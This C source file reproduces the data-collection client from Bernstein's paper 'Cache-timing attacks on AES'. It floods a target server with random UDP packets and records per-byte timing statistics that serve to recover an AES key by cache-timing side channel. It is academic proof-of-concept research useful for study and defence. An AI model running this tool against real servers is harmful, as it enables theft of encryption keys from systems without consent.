/**
 * Original code from paper:
 *    Cache-timing attacks on AES
 * By:
 *    Daniel J. BERNSTEIN
 *    Department of Mathematics, Statistics, and Computer Science (M/C 249)
 *    The University of Illinois at Chicago
 *    Chicago, IL 60607–7045
 *    djb@cr.yp.to
 *
 */

#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <stdio.h>
#include <math.h>

double packets;
double ttotal;
double t[16][256];
double tsq[16][256];
long long tnum[16][256];
double u[16][256];
double udev[16][256];
char n[16];

void tally(double timing)
{
    int j;
    int b;
    for (j = 0; j < 16; ++j)
    {
        b = 255 & (int)n[j];
        ++packets;
        ttotal += timing;
        t[j][b] += timing;
        tsq[j][b] += timing * timing;
        tnum[j][b] += 1;
    }
}

int s;
int size;

void studyinput(void)
{
    int j;
    char packet[2048];
    char response[40];
    struct pollfd p;
    for (;;)
    {
        if (size < 16)
            continue;
        if (size > sizeof packet)
            continue;
        /* a mediocre PRNG is sufficient here */
        for (j = 0; j < size; ++j)
            packet[j] = random();
        for (j = 0; j < 16; ++j)
            n[j] = packet[j];
        send(s, packet, size, 0);
        p.fd = s;
        p.events = POLLIN;
        if (poll(&p, 1, 100) <= 0)
            continue;
        while (p.revents & POLLIN)
        {
            if (recv(s, response, sizeof response, 0) == sizeof response)
            {
                if (!memcmp(packet, response, 16))
                {
                    unsigned int timing;
                    timing = *(unsigned int *)(response + 36);
                    timing -= *(unsigned int *)(response + 32);
                    if (timing < 10000)
                    { /* clip tail to reduce noise */
                        tally(timing);
                        return;
                    }
                }
            }
            if (poll(&p, 1, 0) <= 0)
                break;
        }
    }
}

void printpatterns(void)
{
    int j;
    int b;
    double taverage;
    taverage = ttotal / packets;
    for (j = 0; j < 16; ++j)
        for (b = 0; b < 256; ++b)
        {
            u[j][b] = t[j][b] / tnum[j][b];
            udev[j][b] = tsq[j][b] / tnum[j][b];
            udev[j][b] -= u[j][b] * u[j][b];
            udev[j][b] = sqrt(udev[j][b]);
        }
    for (j = 0; j < 16; ++j)
    {
        for (b = 0; b < 256; ++b)
        {
            printf("%2d %4d %3d %lld %.3f %.3f %.6f %.6f\n", j, size, b, tnum[j][b], u[j][b], udev[j][b], u[j][b] - taverage, udev[j][b] / sqrt(tnum[j][b]));
        }
    }
    fflush(stdout);
}

int timetoprint(long long inputs)
{
    if (inputs < 10000)
        return 0;
    if (!(inputs & (inputs - 1)))
        return 1;
    return 0;
}

int main(int argc, char **argv)
{
    struct sockaddr_in server;
    long long inputs = 0;
    if (!argv[1])
        return 100;
    if (!inet_aton(argv[1], &server.sin_addr))
        return 100;
    server.sin_family = AF_INET;
    server.sin_port = htons(10000);
    if (!argv[2])
        return 100;
    size = atoi(argv[2]);
    while ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        sleep(1);
    while (connect(s, (struct sockaddr *)&server, sizeof server) == -1)
        sleep(1);
    for (;;)
    {
        studyinput();
        ++inputs;
        if (timetoprint(inputs))
            printpatterns();
    }
}